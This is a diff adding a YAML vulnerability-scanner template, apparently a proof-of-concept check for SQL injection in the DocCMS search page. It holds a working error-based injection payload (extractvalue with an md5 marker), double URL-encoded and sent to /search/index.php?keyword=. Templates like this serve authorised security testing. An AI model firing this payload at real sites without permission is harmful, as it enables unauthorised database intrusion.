@@ -1,0 +1,20 @@
+name: yaml-poc-doccms-doccms-sql_injection-CT-416442
+binding: b89a1eda-8d1d-4e81-b073-5b1c46c435b7
+detail:
+    author: system_user
+    vulnerability:
+        id: 3f13a1a4-69a4-4345-9e68-55636974d928
+        level: high
+transport: http
+set:
+    s1: string(randomInt(10000, 20000))
+    payload: |
+        urlencodeall(urlencodeall("1' and (extractvalue(1,concat(0x7e,(select md5(" + s1 + ")),0x7e)))#"))
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /search/index.php?keyword={{payload}}
+        expression: response.body.bcontains(bytes(substr(md5(s1), 1, 30)))
+expression: r0()
